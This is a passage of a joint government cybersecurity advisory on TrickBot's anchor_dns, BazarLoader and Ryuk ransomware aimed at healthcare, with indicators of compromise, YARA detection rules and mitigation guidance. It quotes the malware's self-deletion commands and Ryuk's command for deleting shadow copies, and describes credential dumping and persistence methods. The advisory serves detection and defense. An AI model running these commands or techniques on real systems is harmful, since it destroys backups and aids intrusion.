After successful execution, anchor_dns further deploys malicious batch scripts (.bat) using PowerShell commands.
The malware deploys self-deletion techniques by executing the following commands.

cmd.exe /c timeout 3 && del C:\Users\[username]\[malware_sample]
cmd.exe /C PowerShell \""Start-Sleep 3; Remove-Item C:\Users\[username]\[malware_sample_location]\""

The following domains found in outbound DNS records are associated with anchor_dns.

kostunivo[.]com
chishir[.]com
mangoclone[.]com
onixcellent[.]com

This malware used the following legitimate domains to test internet connectivity.

ipecho[.]net
api[.]ipify[.]org
checkip[.]amazonaws[.]com
ip[.]anysrc[.]net
wtfismyip[.]com
ipinfo[.]io
icanhazip[.]com
myexternalip[.]com
ident[.]me

Currently, there is an open-source tracker for TrickBot C2 servers located at https://feodotracker.abuse.ch/browse/trickbot/.
The anchor_dns malware historically used the following C2 servers.

23[.]95[.]97[.]59
51[.]254[.]25[.]115
193[.]183[.]98[.]66
91[.]217[.]137[.]37
87[.]98[.]175[.]85

TrickBot YARA Rules
rule anchor_dns_strings_filenames {
    meta:
        description = ""Rule to detect AnchorDNS samples based off strings or filenames used in malware""
        author = ""NCSC""
        hash1 = ""fc0efd612ad528795472e99cae5944b68b8e26dc""
        hash2 = ""794eb3a9ce8b7e5092bb1b93341a54097f5b78a9""
        hash3 = ""9dfce70fded4f3bc2aa50ca772b0f9094b7b1fb2""
        hash4 = ""24d4bbc982a6a561f0426a683b9617de1a96a74a""
    strings:
        $ = "",Control_RunDLL \x00""
        $ = "":$GUID"" ascii wide
        $ = "":$DATA"" ascii wide
        $ = ""/1001/""
        $ = /(\x00|\xCC)qwertyuiopasdfghjklzxcvbnm(\x00|\xCC)/
        $ = /(\x00|\xCC)QWERTYUIOPASDFGHJKLZXCVBNM(\x00|\xCC)/
        $ = ""start program with cmdline \""%s\""""
        $ = ""Global\\fde345tyhoVGYHUJKIOuy""
        $ = ""ChardWorker::thExecute: error registry me""
        $ = ""get command: incode %s, cmdid \""%s\"", cmd \""%s\""""
        $ = ""anchorDNS""
        $ = ""Anchor_x86""
        $ = ""Anchor_x64""
    condition:
        (uint16(0) == 0x5A4D and uint16(uint32(0x3c)) == 0x4550) and 3 of them
}
rule anchor_dns_icmp_transport {
    meta:
        description = ""Rule to detect AnchorDNS samples based off ICMP transport strings""
        author = ""NCSC""
        hash1 = ""056f326d9ab960ed02356b34a6dcd72d7180fc83""
    strings:
        $ = ""reset_connection <- %s""
        $ = ""server_ok <- %s (packets on server %s)""
        $ = ""erase successfully transmitted packet (count: %d)""
        $ = ""Packet sended with crc %s -> %s""
        $ = ""send data confimation to server(%s)""
        $ = ""data recived from <- %s""
        $ = ""Rearmost packed recived (id: %s)""
        $ = ""send poll to server -> : %s""
    condition:
        (uint16(0) == 0x5A4D and uint16(uint32(0x3c)) == 0x4550) and 3 of them
}
rule anchor_dns_config_dexor {
    meta:
        description = ""Rule to detect AnchorDNS samples based off configuration deobfuscation (XOR 0x23 countup)""
        author = ""NCSC""
        hash1 = ""d0278ec015e10ada000915a1943ddbb3a0b6b3db""
        hash2 = ""056f326d9ab960ed02356b34a6dcd72d7180fc83""
    strings:
        $x86 = {75 1F 56 6A 40 B2 23 33 C9 5E 8A 81 ?? ?? ?? ?? 32 C2 FE C2 88 81 ?? ?? ?? ?? 41 83 EE 01 75 EA 5E B8 ?? ?? ?? ?? C3}
        $x64 = {41 B0 23 41 B9 80 00 00 00 8A 84 3A ?? ?? ?? 00 41 32 C0 41 FE C0 88 04 32 48 FF C2 49 83 E9 01 75 E7}
    condition:
        (uint16(0) == 0x5A4D and uint16(uint32(0x3c)) == 0x4550) and any of them
}
rule anchor_dns_installer {
    meta:
        description = ""Rule to detect AnchorDNS installer samples based off MZ magic under one-time pad or deobfuscation loop code""
        author = ""NCSC""
        hash1 = ""fa98074dc18ad7e2d357b5d168c00a91256d87d1""
        hash2 = ""78f0737d2b1e605aad62af252b246ef390521f02""
    strings:
        $pre = {43 00 4F 00 4E 00 4F 00 55 00 54 00 24 00 00 00} //CONOUT$
        $pst = {6B 65 72 6E 65 6C 33 32 2E 64 6C 6C 00 00 00 00} //kernel32.dll
        $deob_x86 = {8B C8 89 4D F8 83 F9 FF 74 52 46 89 5D F4 88 5D FF 85 F6 74 34 8A 83 ?? ?? ?? ?? 32 83 ?? ?? ?? ?? 6A 00 88 45 FF 8D 45 F4 50 6A 01 8D 45 FF 50 51 FF 15 34 80 41 00 8B 4D F8 43 8B F0 81 FB 00 ?? ?? ?? 72 CC 85 F6 75 08}
        $deob_x64 = {42 0F B6 84 3F ?? ?? ?? ?? 4C 8D 8C 24 80 00 00 00 42 32 84 3F ?? ?? ?? ?? 48 8D 54 24 78 41 B8 01 00 00 00 88 44 24 78 48 8B CE 48 89 6C 24 20 FF 15 ?? ?? ?? ?? 48 FF C7 8B D8 48 81 FF ?? ?? ?? ?? 72 B8}
    condition:
        (uint16(0) == 0x5A4D and uint16(uint32(0x3c)) == 0x4550)
        and
            (   uint16(@pre+16) ^ uint16(@pre+16+((@pst-(@pre+16))\2)) == 0x5A4D
                or
                $deob_x86 or $deob_x64
            )
}
import ""pe""
rule anchor_dns_string_1001_with_pe_section_dll_export_resolve_ip_domains {
    meta:
        description = ""Rule to detect AnchorDNS samples based off /1001/ string in combination with DLL export name string, PE section .addr or IP resolution domains""
        author = ""NCSC""
        hash1 = ""ff8237252d53200c132dd742edc77a6c67565eee""
        hash2 = ""c8299aadf886da55cb47e5cbafe8c5a482b47fc8""
    strings:
        $str1001 = {2F 31 30 30 31 2F 00} // /1001/
        $strCtrl = {2C 43 6F 6E 74 72 6F 6C 5F 52 75 6E 44 4C 4C 20 00} // ,Control_RunDLL
        $ip1 = ""checkip.amazonaws.com"" ascii wide
        $ip2 = ""ipecho.net"" ascii wide
        $ip3 = ""ipinfo.io"" ascii wide
        $ip4 = ""api.ipify.org"" ascii wide
        $ip5 = ""icanhazip.com"" ascii wide
        $ip6 = ""myexternalip.com"" ascii wide
        $ip7 = ""wtfismyip.com"" ascii wide
        $ip8 = ""ip.anysrc.net"" ascii wide
    condition:
        (uint16(0) == 0x5A4D and uint16(uint32(0x3c)) == 0x4550)
        and $str1001
        and (
                for any i in (0..pe.number_of_sections): (
                   pe.sections[i].name == "".addr""
                )
            or
                $strCtrl
            or
                6 of ($ip*)
            )
}
rule anchor_dns_check_random_string_in_dns_response {
    meta:
        description = ""Rule to detect AnchorDNS samples based off checking random string in DNS response""
        author = ""NCSC""
        hash1 = ""056f326d9ab960ed02356b34a6dcd72d7180fc83""
        hash2 = ""14e9d68bba7a184863667c680a8d5a757149aa36""
    strings:
        $x86 = {8A D8 83 C4 10 84 DB 75 08 8B 7D BC E9 84 00 00 00 8B 7D BC 32 DB 8B C7 33 F6 0F 1F 00 85 C0 74 71 40 6A 2F 50 E8 ?? ?? ?? ?? 46 83 C4 08 83 FE 03 72 EA 85 C0 74 5B 83 7D D4 10 8D 4D C0 8B 75 D0 8D 50 01 0F 43 4D C0 83 EE 04 72 11 8B 02 3B 01 75 10 83 C2 04 83 C1 04 83 EE 04 73 EF 83 FE FC 74 2D 8A 02 3A 01 75 29 83 FE FD 74 22 8A 42 01 3A 41 01 75 1C 83 FE FE 74 15 8A 42 02 3A 41 02 75 0F 83 FE FF 74 08 8A 42 03 3A 41 03 75 02 B3 01 8B 75 B8}
        $x64 = {4C 39 75 EF 74 56 48 8D 45 DF 48 83 7D F7 10 48 0F 43 45 DF 49 8B FE 48 85 C0 74 40 48 8D 48 01 BA 2F 00 00 00 E8 ?? ?? ?? ?? 49 03 FF 48 83 FF 03 72 E4 48 85 C0 74 24 48 8D 55 1F 48 83 7D 37 10 48 0F 43 55 1F 48 8D 48 01 4C 8B 45 2F E8 ?? ?? ?? ?? 0F B6 DB 85 C0 41 0F 44 DF 49 03 F7 48 8B 55 F7 48 83 FE 05 0F 82 6A FF FF FF}
    condition:
        (uint16(0) == 0x5A4D and uint16(uint32(0x3c)) == 0x4550) and any of them
}
rule anchor_dns_default_result_execute_command {
    meta:
        description = ""Rule to detect AnchorDNS samples based off default result value and executing command""
        author = ""NCSC""
        hash1 = ""056f326d9ab960ed02356b34a6dcd72d7180fc83""
        hash2 = ""14e9d68bba7a184863667c680a8d5a757149aa36""
    strings:
        $x86 = {83 C4 04 3D 80 00 00 00 73 15 8B 04 85 ?? ?? ?? ?? 85 C0 74 0A 8D 4D D8 51 8B CF FF D0 8A D8 84 DB C7 45 A4 0F 00 00 00}
        $x64 = {48 98 B9 E7 03 00 00 48 3D 80 00 00 00 73 1B 48 8D 15 ?? ?? ?? ?? 48 8B 04 C2 48 85 C0 74 0B 48 8D 55 90 48 8B CE FF D0 8B C8}
    condition:
        (uint16(0) == 0x5A4D and uint16(uint32(0x3c)) == 0x4550) and any of them
}
rule anchor_dns_pdbs {
    meta:
        description = ""Rule to detect AnchorDNS samples based off partial PDB paths""
        author = ""NCSC""
        hash1 = ""f0e575475f33600aede6a1b9a5c14f671cb93b7b""
        hash2 = ""1304372bd4cdd877778621aea715f45face93d68""
        hash3 = ""e5dc7c8bfa285b61dda1618f0ade9c256be75d1a""
        hash4 = ""f96613ac6687f5dbbed13c727fa5d427e94d6128""
        hash5 = ""46750d34a3a11dd16727dc622d127717beda4fa2""
    strings:
        $ = "":\\MyProjects\\secondWork\\Anchor\\""        
        $ = "":\\simsim\\anchorDNS""
        $ = "":\\[JOB]\\Anchor\\""
        $ = "":\\Anchor\\Win32\\Release\\Anchor_""
        $ = "":\\Users\\ProFi\\Desktop\\data\\Win32\\anchor""
    condition:
        (uint16(0) == 0x5A4D and uint16(uint32(0x3c)) == 0x4550) and any of them
}
BazarLoader/BazarBackdoor
Beginning in approximately early 2020, actors believed to be associated with TrickBot began using BazarLoader and BazarBackdoor to infect victim networks. The loader and backdoor work closely together to achieve infection and communicate with the same C2 infrastructure. Campaigns using Bazar represent a new technique for cybercriminals to infect and monetize networks and have increasingly led to the deployment of ransomware, including Ryuk. BazarLoader has become one of the most commonly used vectors for ransomware deployment.
Deployment of the BazarLoader malware typically comes from phishing email and contains the following:

Phishing emails are typically delivered by commercial mass email delivery services. Email received by a victim will contain a link to an actor-controlled Google Drive document or other free online filehosting solutions, typically purporting to be a PDF file.
This document usually references a failure to create a preview of the document and contains a link to a URL hosting a malware payload in the form of a misnamed or multiple extension file.
Emails can appear as routine, legitimate business correspondence about customer complaints, hiring decision, or other important tasks that require the attention of the recipient.  
Some email communications have included the recipient’s name or employer name in the subject line and/or email body.

Through phishing emails linking users to Google Documents, actors used the below identified file names to install BazarLoader:

Report-Review26-10.exe
Review_Report15-10.exe
Document_Print.exe
Report10-13.exe
Text_Report.exe

Bazar activity can be identified by searching the system startup folders and Userinit values under the HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon registry key:
%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\adobe.lnk
For a comprehensive list of indicators of compromise regarding the BazarLocker and other malware, see https://www.fireeye.com/blog/threat-research/2020/10/kegtap-and-singlemalt-with-a-ransomware-chaser.html.
Indicators
In addition to TrickBot and BazarLoader, threat actors are using malware, such as KEGTAP, BEERBOT, SINGLEMALT, and others as they continue to change tactics, techniques, and procedures in their highly dynamic campaign. The following C2 servers are known to be associated with this malicious activity.

45[.]148[.]10[.]92
170[.]238[.]117[.]187
177[.]74[.]232[.]124
185[.]68[.]93[.]17
203[.]176[.]135[.]102
96[.]9[.]73[.]73
96[.]9[.]77[.]142
37[.]187[.]3[.]176
45[.]89[.]127[.]92
62[.]108[.]35[.]103
91[.]200[.]103[.]242
103[.]84[.]238[.]3
36[.]89[.]106[.]69
103[.]76[.]169[.]213
36[.]91[.]87[.]227
105[.]163[.]17[.]83
185[.]117[.]73[.]163
5[.]2[.]78[.]118
185[.]90[.]61[.]69
185[.]90[.]61[.]62
86[.]104[.]194[.]30
31[.]131[.]21[.]184
46[.]28[.]64[.]8
104[.]161[.]32[.]111
107[.]172[.]140[.]171
131[.]153[.]22[.]148
195[.]123[.]240[.]219
195[.]123[.]242[.]119
195[.]123[.]242[.]120
51[.]81[.]113[.]25
74[.]222[.]14[.]27

Ryuk Ransomware
Typically Ryuk has been deployed as a payload from banking Trojans such as TrickBot. (See the United Kingdom (UK) National Cyber Security Centre (NCSC) advisory, Ryuk Ransomware Targeting Organisations Globally, on their ongoing investigation into global Ryuk ransomware campaigns and associated Emotet and TrickBot malware.) Ryuk first appeared in August 2018 as a derivative of Hermes 2.1 ransomware, which first emerged in late 2017 and was available for sale on the open market as of August 2018. Ryuk still retains some aspects of the Hermes code. For example, all of the files encrypted by Ryuk contain the HERMES tag but, in some infections, the files have .ryk added to the filename, while others do not. In other parts of the ransomware code, Ryuk has removed or replaced features of Hermes, such as the restriction against targeting specific Eurasia-based systems.
While negotiating the victim network, Ryuk actors will commonly use commercial off-the-shelf products—such as Cobalt Strike and PowerShell Empire—in order to steal credentials. Both frameworks are very robust and are highly effective dual-purpose tools, allowing actors to dump clear text passwords or hash values from memory with the use of Mimikatz. This allows the actors to inject malicious dynamic-link library into memory with read, write, and execute permissions. In order to maintain persistence in the victim environment, Ryuk actors have been known to use scheduled tasks and service creation.
Ryuk actors will quickly map the network in order to enumerate the environment to understand the scope of the infection. In order to limit suspicious activity and possible detection, the actors choose to live off the land and, if possible, use native tools—such as net view, net computers, and ping—to locate mapped network shares, domain controllers, and active directory. In order to move laterally throughout the network, the group relies on native tools, such as PowerShell, Windows Management Instrumentation (WMI), Windows Remote Management , and Remote Desktop Protocol (RDP). The group also uses third-party tools, such as Bloodhound.
Once dropped, Ryuk uses AES-256 to encrypt files and an RSA public key to encrypt the AES key. The Ryuk dropper drops a .bat file that attempts to delete all backup files and Volume Shadow Copies (automatic backup snapshots made by Windows), preventing the victim from recovering encrypted files without the decryption program.
In addition, the attackers will attempt to shut down or uninstall security applications on the victim systems that might prevent the ransomware from executing. Normally this is done via a script, but if that fails, the attackers are capable of manually removing the applications that could stop the attack. The RyukReadMe file placed on the system after encryption provides either one or two email  addresses, using the end-to-end encrypted email provider Protonmail, through which the victim can contact the attacker(s). While earlier versions provide a ransom amount in the initial notifications, Ryuk users are now designating a ransom amount only after the victim makes contact.
The victim is told how much to pay to a specified Bitcoin wallet for the decryptor and is provided a sample decryption of two files.
Initial testing indicates that the RyukReadMe file does not need to be present for the decryption script to run successfully but other reporting advises some files will not decrypt properly without it. Even if run correctly, there is no guarantee the decryptor will be effective. This is further complicated because the RyukReadMe file is deleted when the script is finished. This may affect the decryption script unless it is saved and stored in a different location before running.
According to MITRE, Ryuk uses the ATT&CK techniques listed in table 1.
Table 1: Ryuk ATT&CK techniques



Technique
Use




System Network Configuration Discovery [T1016]
Ryuk has called GetIpNetTable in attempt to identify all mounted drives and hosts that have Address Resolution Protocol entries. 



Masquerading: Match Legitimate Name or Location [T1036.005]

Ryuk has constructed legitimate appearing installation folder paths by calling GetWindowsDirectoryW and then inserting a null byte at the fourth character of the path. For Windows Vista or higher, the path would appear as C:\Users\Public. 


Process Injection [T1055]
Ryuk has injected itself into remote processes to encrypt files using a combination of VirtualAlloc, WriteProcessMemory, and CreateRemoteThread. 


Process Discovery [T1057]
Ryuk has called CreateToolhelp32Snapshot to enumerate all running processes. 


Command and Scripting Interpreter: Windows Command Shell [T1059.003]
Ryuk has used cmd.exe to create a Registry entry to establish persistence. 


File and Directory Discovery [T1083]
Ryuk has called GetLogicalDrives to enumerate all mounted drives, and GetDriveTypeW to determine the drive type.


Native API [T1106]
Ryuk has used multiple native APIs including ShellExecuteW to run executables; GetWindowsDirectoryW to create folders; and VirtualAlloc, WriteProcessMemory, and CreateRemoteThread for process injection. 


Access Token Manipulation [T1134]
Ryuk has attempted to adjust its token privileges to have the SeDebugPrivilege. 


Data Encrypted for Impact [T1486]
Ryuk has used a combination of symmetric and asymmetric encryption to encrypt files. Files have been encrypted with their own AES key and given a file extension of .RYK. Encrypted directories have had a ransom note of RyukReadMe.txt written to the directory. 


Service Stop [T1489]
Ryuk has called kill.bat for stopping services, disabling services and killing processes. 


Inhibit System Recovery [T1490]
Ryuk has used vssadmin Delete Shadows /all /quiet to delete volume shadow copies and vssadmin resize shadowstorage to force deletion of shadow copies created by third-party applications. 


Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder [T1047.001]
Ryuk has used the Windows command line to create a Registry entry under HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run to establish persistence.


Impair Defenses: Disable or Modify Tools [T1562.001]
Ryuk has stopped services related to anti-virus.




Mitigations

For a downloadable copy of IOCs, see AA20-302A.stix. For additional IOCs detailing this activity, see https://gist.github.com/aaronst/6aa7f61246f53a8dd4befea86e832456.
Plans and Policies
CISA, FBI, and HHS encourage HPH Sector organizations to maintain business continuity plans—the practice of executing essential functions through emergencies (e.g., cyberattacks)—to minimize service interruptions. Without planning, provision, and implementation of continuity principles, organizations may be unable to continue operations. Evaluating continuity and capability will help identify continuity gaps. Through identifying and addressing these gaps, organizations can establish a viable continuity program that will help keep them functioning during cyberattacks or other emergencies. CISA, FBI, and HHS suggest HPH Sector organizations review or establish patching plans, security policies, user agreements, and business continuity plans to ensure they address current threats posed by malicious cyber actors.
Network Best Practices

Patch operating systems, software, and firmware as soon as manufacturers release updates.
Check configurations for every operating system version for HPH organization-owned assets to prevent issues from arising that local users are unable to fix due to having local administration disabled.
Regularly change passwords to network systems and accounts and avoid reusing passwords for different accounts.
Use multi-factor authentication where possible.
Disable unused remote access/Remote Desktop Protocol (RDP) ports and monitor remote access/RDP logs.
Implement application and remote access allow listing to only allow systems to execute programs known and permitted by the established security policy.
Audit user accounts with administrative privileges and configure access controls with least privilege in mind.
Audit logs to ensure new accounts are legitimate.
Scan for open or listening ports and mediate those that are not needed.
Identify critical assets such as patient database servers, medical records, and teleheatlh and telework infrastructure; create backups of these systems and house the backups offline from the network.
Implement network segmentation. Sensitive data should not reside on the same server and network segment as the email environment.
Set antivirus and anti-malware solutions to automatically update; conduct regular scans.

Ransomware Best Practices
CISA, FBI and HHS do not recommend paying ransoms. Payment does not guarantee files will be recovered. It may also embolden adversaries to target additional organizations, encourage other criminal actors to engage in the distribution of ransomware, and/or fund illicit activities. In addition to implementing the above network best practices, the FBI, CISA and HHS also recommend the following:

Regularly back up data, air gap, and password protect backup copies offline.
Implement a recovery plan to maintain and retain multiple copies of sensitive or proprietary data and servers in a physically separate, secure location.

User Awareness Best Practices

Focus on awareness and training. Because end users are targeted, make employees and stakeholders aware of the threats—such as ransomware and phishing scams—and how they are delivered. Additionally, provide users training on information security principles and techniques as well as overall emerging cybersecurity risks and vulnerabilities.
Ensure that employees know who to contact when they see suspicious activity or when they believe they have been a victim of a cyberattack. This will ensure that the proper established mitigation strategy can be employed quickly and efficiently.

Recommended Mitigation Measures
System administrators who have indicators of a TrickBot network compromise should immediately take steps to back up and secure sensitive or proprietary data. TrickBot infections may be indicators of an imminent ransomware attack; system administrators should take steps to secure network devices accordingly. Upon evidence of a TrickBot infection, review DNS logs and use the XOR key of 0xB9 to decode XOR encoded DNS requests to reveal the presence of Anchor_DNS, and maintain and provide relevant logs.
GENERAL RANSOMWARE MITIGATIONS — HPH SECTOR
This section is based on CISA and Multi-State Information Sharing and Analysis Center (MS-ISAC)'s Joint Ransomware Guide, which can be found at https://www.cisa.gov/publication/ransomware-guide.
CISA, FBI, and HHS recommend that healthcare organizations implement both ransomware prevention and ransomware response measures immediately.
Ransomware Prevention
Join and Engage with Cybersecurity Organizations
CISA, FBI, and HHS recommend that healthcare organizations take the following initial steps:

Join a healthcare information sharing organization, H-ISAC:

Health Information Sharing and Analysis Center (H-ISAC): https://h-isac.org/membership-account/join-h-isac/
Sector-based ISACs - National Council of ISACs: https://www.nationalisacs.org/member-isacs
Information Sharing and Analysis Organization (ISAO) Standards Organization: https://www.isao.org/information-sharing-groups/


Engage with CISA and FBI, as well as HHS—through the HHS Health Sector Cybersecurity Coordination Center (HC3)—to build a lasting partnership and collaborate on information sharing, best practices, assessments, and exercises.

CISA: cisa.gov, https://us-cert.cisa.gov/mailing-lists-and-feeds, central@cisa.gov  
FBI: ic3.gov, www.fbi.gov/contact-us/field, CyWatch@fbi.gov
HHS/HC3: http://www.hhs.gov/hc3, HC3@HHS.gov



Engaging with the H-ISAC, ISAO, CISA, FBI, and HHS/HC3 will enable your organization to receive critical information and access to services to better manage the risk posed by ransomware and other cyber threats.
Follow Ransomware Best Practices
Refer to the best practices and references below to help manage the risk posed by ransomware and support your organization’s coordinated and efficient response to a ransomware incident. Apply these practices to the greatest extent possible based on availability of organizational resources.

It is critical to maintain offline, encrypted backups of data and to regularly test your backups. Backup procedures should be conducted on a regular basis. It is important that backups be maintained offline or in separated networks as many ransomware variants attempt to find and delete any accessible backups. Maintaining offline, current backups is most critical because there is no need to pay a ransom for data that is readily accessible to your organization.

Use the 3-2-1 rule as a guideline for backup practices. The rule states that three copies of all critical data are retained on at least two different types of media and at least one of them is stored offline.
Maintain regularly updated “gold images” of critical systems in the event they need to be rebuilt. This entails maintaining image “templates” that include a preconfigured operating system (OS) and associated software applications that can be quickly deployed to rebuild a system, such as a virtual machine or server.
Retain backup hardware to rebuild systems in the event rebuilding the primary system is not preferred.

Hardware that is newer or older than the primary system can present installation or compatibility hurdles when rebuilding from images.
Ensure all backup hardware is properly patched.




In addition to system images, applicable source code or executables should be available (stored with backups, escrowed, license agreement to obtain, etc.). It is more efficient to rebuild from system images, but some images will not install on different hardware or platforms correctly; having separate access to needed software will help in these cases.
Create, maintain, and exercise a basic cyber incident response plan and associated communications plan that includes response and notification procedures for a ransomware incident.

Review available incident response guidance, such as CISA’s Technical Approaches to Uncovering and Remediating Malicious Activity https://us-cert.cisa.gov/ncas/alerts/aa20-245a.


Help your organization better organize around cyber incident response.
Develop a cyber incident response plan.
The Ransomware Response Checklist, available in the CISA and MS-ISAC Joint Ransomware Guide, serves as an adaptable, ransomware- specific annex to organizational cyber incident response or disruption plans.
Review and implement as applicable MITRE’s Medical Device Cybersecurity: Regional Incident Preparedness and Response Playbook (https://www.mitre.org/sites/default/files/publications/pr-18-1550-Medical-Device-Cybersecurity-Playbook.pdf).
Develop a risk management plan that maps critical health services and care to the necessary information systems; this will ensure that the incident response plan will contain the proper triage procedures.
Plan for the possibility of critical information systems being inaccessible for an extended period of time. This should include but not be limited to the following:

Print and properly store/protect hard copies of digital information that would be required for critical patient healthcare.
Plan for and periodically train staff to handle the re-routing of incoming/existing patients in an expedient manner if information systems were to abruptly and unexpectedly become unavailable.
Coordinate the potential for surge support with other healthcare facilities in the greater local area. This should include organizational leadership periodically meeting and collaborating with counterparts in the greater local area to create/update plans for their facilities to both abruptly send and receive a significant amount of critical patients for immediate care. This may include the opportunity to re-route healthcare employees (and possibly some equipment) to provide care along with additional patients.


Consider the development of a second, air-gapped communications network that can provide a minimum standard of backup support for hospital operations if the primary network becomes unavailable if/when needed.
Predefine network segments, IT capabilities and other functionality that can either be quickly separated from the greater network or shut down entirely without impacting operations of the rest of the IT infrastructure.
Legacy devices should be identified and inventoried with highest priority and given special consideration during a ransomware event.
See CISA and MS-ISAC's Joint Ransomware Guide for infection vectors including internet-facing vulnerabilities and misconfigurations; phishing; precursor malware infection; and third parties and managed service providers.
HHS/HC3 tracks ransomware that is targeting the HPH Sector; this information can be found at http://www.hhs.gov/hc3.

Hardening Guidance

The Food and Drug Administration provides multiple guidance documents regarding the hardening of healthcare and specifically medical devices found here: https://www.fda.gov/medical-devices/digital-health-center-excellence/cybersecurity.
See CISA and MS-ISAC's Joint Ransomware Guide for additional in-depth hardening guidance.

Contact CISA for These No-Cost Resources

Information sharing with CISA and MS-ISAC (for SLTT organizations) includes bi-directional sharing of best practices and network defense information regarding ransomware trends and variants as well as malware that is a precursor to ransomware.
Policy-oriented or technical assessments help organizations understand how they can improve their defenses to avoid ransomware infection: https://www.cisa.gov/cyber-resource-hub.

Assessments include Vulnerability Scanning and Phishing Campaign Assessment.


Cyber exercises evaluate or help develop a cyber incident response plan in the context of a ransomware incident scenario.
CISA Cybersecurity Advisors (CSAs) advise on best practices and connect you with CISA resources to manage cyber risk.
Contacts:

SLTT organizations: CyberLiaison_SLTT@cisa.dhs.gov
Private sector organizations: CyberLiaison_Industry@cisa.dhs.gov



Ransomware Quick References

Ransomware: What It Is and What to Do About It (CISA): General ransomware guidance for organizational leadership and more in-depth information for CISOs and technical staff: https://www.us-cert.cisa.gov/sites/default/files/publications/Ransomware_Executive_One-Pager_and_Technical_ Document-FINAL.pdf
Ransomware (CISA): Introduction to ransomware, notable links to CISA products on protecting networks, specific ransomware threats, and other resources: https://www.us-cert.cisa.gov/Ransomware  
HHS/HC3: Ransomware that impacts HPH is tracked by the HC3 and can be found at www.hhs.gov/hc3
Security Primer – Ransomware (MS-ISAC): Outlines opportunistic and strategic ransomware campaigns, common infection vectors, and best practice recommendations: https://www.cisecurity.org/white-papers/security-primer-ransomware/
Ransomware: Facts, Threats, and Countermeasures (MS- ISAC): Facts about ransomware, infection vectors, ransomware capabilities, and how to mitigate the risk of ransomware infection: https://www.cisecurity.org/blog/ransomware- facts-threats-and-countermeasures/
HHS Ransomware Fact Sheet: https://www.hhs.gov/sites/default/files/RansomwareFactSheet.pdf
NIST Securing Data Integrity White Paper: https://csrc.nist.gov/publications/detail/white-paper/2020/10/01/securing-data-integrity-against-ransomware-attacks/draft

Ransomware Response Checklist
Remember: Paying the ransom will not ensure your data is decrypted or that your systems or data will no longer be compromised. CISA, FBI, and HHS do not recommend paying ransom.
Should your organization be a victim of ransomware, CISA strongly recommends responding by using the Ransomware Response Checklist located in CISA and MS-ISAC's Joint Ransomware Guide, which contains steps for detection and analysis as well as containment and eradication.
Consider the Need For Extended Identification or Analysis
If extended identification or analysis is needed, CISA, HHS/HC3, or federal law enforcement may be interested in any of the following information that your organization determines it can legally share:

Recovered executable file
Copies of the readme file – DO NOT REMOVE the file or decryption may not be possible
Live memory (RAM) capture from systems with additional signs of compromise (use of exploit toolkits, RDP activity, additional files found locally)
Images of infected systems with additional signs of compromise (use of exploit toolkits, RDP activity, additional files found locally)
Malware samples
Names of any other malware identified on your system
Encrypted file samples
Log files (Windows Event Logs from compromised systems, Firewall logs, etc.)
Any PowerShell scripts found having executed on the systems
Any user accounts created in Active Directory or machines added to the network during the exploitation
Email addresses used by the attackers and any associated phishing emails
A copy of the ransom note
Ransom amount and whether or not the ransom was paid
Bitcoin wallets used by the attackers
Bitcoin wallets used to pay the ransom (if applicable)
Copies of any communications with attackers

Upon voluntary request, CISA can assist with analysis (e.g., phishing emails, storage media, logs, malware) at no cost to support your organization in understanding the root cause of an incident, even in the event additional remote assistance is not requested.

CISA – Advanced Malware Analysis Center: https://www.malware.us-cert.gov/MalwareSubmission/pages/submission.jsf
Remote Assistance – Request via Central@cisa.gov


Contact Information

CISA, FBI, and HHS recommend identifying and having on hand the following contact information for ready use should your organization become a victim of a ransomware incident. Consider contacting these organizations for mitigation and response assistance or for purpose of notification.

State and Local Response Contacts
IT/IT Security Team – Centralized Cyber Incident Reporting
State and Local Law Enforcement
Fusion Center        
Managed/Security Service Providers
Cyber Insurance       

To report suspicious or criminal activity related to information found in this Joint Cybersecurity Advisory, contact your local FBI field office at www.fbi.gov/contact-us/field, or the FBI’s 24/7 Cyber Watch (CyWatch) at (855) 292-3937 or by email at CyWatch@fbi.gov. When available, please include the following information regarding the incident: date, time, and location of the incident; type of activity; number of people affected; type of equipment used for the activity; the name of the submitting company or organization; and a designated point of contact. To request incident response resources or technical assistance related to these threats, contact CISA at Central@cisa.gov.
Additionally, see CISA and MS-ISAC's Joint Ransomware Guide for information on contacting—and what to expect from contacting—federal asset response and federal threat response contacts.
Disclaimer
This document is marked TLP:WHITE. Disclosure is not limited. Sources may use TLP:WHITE when information carries minimal or no foreseeable risk of misuse, in accordance with applicable rules and procedures for public release. Subject to standard copyright rules, TLP:WHITE information may be distributed without restriction. For more information on the Traffic Light Protocol, see https://cisa.gov/tlp.

References

CISA Emergency Services Sector Continuity Planning Suite 
CISA MS-ISAC Joint Ransomware Guide
CISA Tip: Avoiding Social Engineering and Phishing Attacks
FBI PSA: “High-Impact Ransomware Attacks Threaten U.S. Businesses and Organizations""
Health Industry Cybersecurity Tactical Crisis Response
Health Industry Cybersecurity Practices (HICP) 
HHS - Ransomware Spotlight Webinar 
HHS - Health Industry Cybersecurity Practices: Managing Threats and Protecting Patients
HHS - Ransomware Briefing 
HHS - Aggressive Ransomware Impacts
HHS - Ransomware Fact Sheet
HHS - Cyber Attack Checklist
HHS - Cyber-Attack Response Infographic
NIST - Data Integrity Publication
NIST - Guide for Cybersecurity Event Recovery
NIST - Identifying and Protecting Assets Against Ransomware and Other Destructive Events 
NIST - Detecting and Responding to Ransomware and Other Destructive Events 
NIST - Recovering from Ransomware and Other Destructive Events 
Github List of IOCs

Revisions

October 28, 2020: Initial version|October 29, 2020: Updated to include information on Conti, TrickBot, and BazarLoader, including new IOCs and Yara Rules for detection|November 2, 2020: Updated FBI link






This product is provided subject to this Notification and this Privacy & Use policy.


","{'T1083', 'T1562.001', 'T1036.005', 'T1486', 'T1047.001', 'T1057', 'T1106', 'T1059.003', 'T1055', 'T1490', 'T1134', 'T1489', 'T1016'}","




Summary

This advisory was updated to include information on Conti, TrickBot, and BazarLoader, including new IOCs and Yara Rules for detection.
This advisory uses the MITRE Adversarial Tactics, Techniques, and Common Knowledge (ATT&CK®) version 7 framework. See the ATT&CK for Enterprise version 7 for all referenced threat actor tactics and techniques.
